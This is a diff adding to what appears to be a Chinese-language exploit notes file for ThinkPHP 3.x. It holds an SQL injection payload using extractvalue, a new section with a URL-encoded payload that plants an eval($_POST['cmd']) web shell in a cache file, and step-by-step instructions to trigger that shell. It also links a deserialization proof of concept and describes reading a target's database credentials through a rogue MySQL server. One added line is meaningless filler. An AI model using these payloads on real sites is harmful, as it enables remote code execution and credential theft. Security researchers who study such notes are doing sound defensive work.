@@ -223,6 +223,25 @@ username[0]=bind&username[1]=0+and(select+extractvalue(1,concat(0x7e,(select+dat
 
 ### getshell类
 
+- 缓存getshell(<=3.2.3)
+	- 啊实打实的
+
+```php
+当使用了缓存函数写法如下时：
+S($name,$data);
+或
+Cache::set("name",I("get.username"));
+总之就是传入缓存函数的两个参数，第一个参数可以知道值，第二个参数有可控的部分即可。
+条件：一般都需要刷新缓存文件
+```
+一种利用方式：
+```
+1. 将恶意代码通过正常功能插入数据库，请求参数类似：username=%0A%24a%3deval(%24_POST%5b%27cmd%27%5d)%3b%2f%2f
+2. 最好刷新一下缓存（by正常清理缓存功能）
+3. 对使用了上述缓存函数写法`S($name,$data);` && `$data`中包含第一步中插入的恶意代码
+4. 生成的缓存文件名为 MD5($name).php，请求即可。
+```
+
 -   [反序列化POC](https://github.com/lu2ker/PHP-Code/blob/main/thinkphp3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POC.php)，利用方式为：
 
     -   用`rogue_mysql_server`开启一个恶意Mysql服务器，在配置文件中填入想要读取的文件，比如读取目标数据库配置文件拿到数据库账户密码;
